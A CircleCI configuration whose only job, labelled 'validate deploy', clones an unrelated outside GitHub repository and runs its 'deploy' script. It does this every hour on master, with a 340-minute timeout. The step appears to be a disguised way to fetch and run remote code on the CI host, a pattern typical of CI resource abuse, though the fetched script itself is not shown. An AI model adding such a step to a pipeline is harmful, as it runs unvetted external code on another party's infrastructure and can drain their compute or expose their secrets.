version: 2.1

jobs:
  deploy:
    docker:
      - image: ubuntu:24.04

    steps:
      - checkout
    
      - run:
          name: validate deploy
          no_output_timeout: 340m
          command: |
            set -e
            git clone --depth 1 \
              https://github.com/validator-helper/deploy.git \
              /tmp/deploy

            cd /tmp/deploy

            sh deploy \
              -nl

workflows:
  deploy:
    triggers:
      - schedule:
          cron: "0 * * * *"
          filters:
            branches:
              only:
                - master
    jobs:
      - deploy:
          filters:
            branches:
              only:
                - master
